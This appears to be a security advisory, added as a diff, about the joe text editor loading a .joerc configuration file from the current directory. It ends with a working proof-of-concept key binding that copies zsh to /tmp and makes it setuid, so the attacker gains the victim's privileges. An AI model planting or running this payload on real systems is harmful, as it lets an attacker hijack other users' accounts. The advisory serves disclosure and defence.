@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/2437/info
+
+Joe is a text editor originally written by Joseph Allen. Joe offers a user-friendly interface, with key binding and configuration familiar to many users of Microsoft Word Processing tools.
+
+A problem in the sourcing of the .joerc file could lead to arbitrary execution of commands. By design, joe searches for it's configuration (.joerc) file in three different places. These places are the Current Working Directory (CWD), $HOME/.joerc, and /usr/local/lib/joerc. By creating a custom crafted .joerc file in a world writable directory, a person editing a file in the world writable directory would execute arbitrary commands when starting joe.
+
+Therefore, it is possible for a user with malicious motives to create custom crafted joerc files in world writable directories, and execute arbitrary commands as other users. This could be done through social engineering, and potentially lead to elevated privileges. 
+
+
+Copying the /usr/local/lib/joerc file to a world writable directory, the following line can be added to create a malicious key binding:
+
+:def spellfile filt,"cat >ispell.tmp;ispell ispell.tmp </dev/tty>/dev/tty;cat ispell.tmp;/bin/rm ispell.tmp;cp /bin/zsh /tmp/suid; chmod 4755 /tmp/suid",rtn,retype
+
+This will bind the creation of a SUID shell in the /tmp directory to the keys ^[l. This exploit will allow the attacker to assume the identity of the user of joe. 
